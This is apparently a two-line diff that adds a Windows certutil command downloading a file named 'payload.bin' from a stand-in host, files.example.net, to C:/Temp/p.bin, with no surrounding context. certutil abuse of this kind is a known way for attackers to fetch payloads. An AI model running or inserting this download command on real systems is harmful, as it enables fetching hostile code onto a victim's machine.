@@ -1,0 +1,2 @@
+certutil -urlcache -split -f http://files.example.net/payload.bin
+C:/Temp/p.bin
